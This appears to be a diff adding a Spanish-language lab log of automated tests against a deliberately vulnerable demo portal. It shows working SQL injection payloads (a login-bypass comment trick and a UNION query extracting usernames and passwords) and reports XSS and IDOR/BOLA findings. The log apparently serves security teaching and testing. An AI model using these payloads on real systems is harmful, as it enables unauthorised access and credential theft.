@@ -1,0 +1,46 @@
+
+==================== A2. Pruebas automatizadas de las 3 vulnerabilidades ====================
+
+$ python exploits/demo_vulns.py
+
+======================================================================
+0. Verificación del servicio
+======================================================================
+GET /salud -> 200 {"estado":"ok","servicio":"stark-portal"}
+
+======================================================================
+1. SQL Injection
+======================================================================
+[VULNERABLE] SQLi en /login (evasión de autenticación)
+    usuario="ana.ti' --" contraseña='cualquier-cosa' -> entró como ana.ti (stark_ti) sin conocer la contraseña
+[VULNERABLE] SQLi en /buscar (UNION: extracción de usuarios y contraseñas)
+    q="zzz' UNION SELECT username, password, rol FROM usuarios --" -> la tabla de productos muestra usuarios y contraseñas
+[VULNERABLE] Mensaje de error SQL visible en /buscar
+    q="'" -> la página muestra el error de SQLite
+
+======================================================================
+2. Cross-Site Scripting (XSS)
+======================================================================
+[VULNERABLE] XSS reflejado en /buscar?q=
+    el payload aparece sin escapar en el HTML (se ejecuta)
+[VULNERABLE] XSS almacenado en /comentarios
+    publicado por sofia.consulta y visto por luis.oper -> el script se ejecuta en el navegador de la víctima
+
+======================================================================
+3. Control de acceso roto (IDOR / BOLA)
+======================================================================
+[VULNERABLE] IDOR en /perfil/<id>
+    luis.oper (id 2) pide /perfil/4 -> ve datos personales de María Garza (RH)
+[VULNERABLE] BOLA en /api/ordenes/<id>
+    luis.oper pide /api/ordenes/4 (pertenece a RH) -> recibe la orden confidencial: {"clasificacion":"Confidencial","contenido":"Total de n\u00f3mina: 3.1 M MXN. RFC y NSS de...
+
+======================================================================
+Resumen
+======================================================================
+  VULNERABLE  SQLi en /login (evasión de autenticación)
+  VULNERABLE  SQLi en /buscar (UNION: extracción de usuarios y contraseñas)
+  VULNERABLE  Mensaje de error SQL visible en /buscar
+  VULNERABLE  XSS reflejado en /buscar?q=
+  VULNERABLE  XSS almacenado en /comentarios
+  VULNERABLE  IDOR en /perfil/<id>
+  VULNERABLE  BOLA en /api/ordenes/<id>
